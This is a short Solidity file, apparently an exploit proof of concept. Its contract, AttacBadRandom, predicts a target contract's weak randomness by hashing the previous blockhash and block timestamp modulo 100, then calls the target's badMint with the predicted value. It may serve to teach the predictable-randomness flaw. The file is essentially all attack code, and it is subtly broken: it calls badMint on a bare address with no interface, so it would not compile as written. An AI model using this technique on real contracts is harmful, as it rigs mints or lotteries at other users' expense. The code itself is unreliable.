// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract AttacBadRandom {
    function attacBadMint(address mintAddr) external {
        uint256 luckNum = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        ) % 100;

        mintAddr.badMint(luckNum);
    }
}
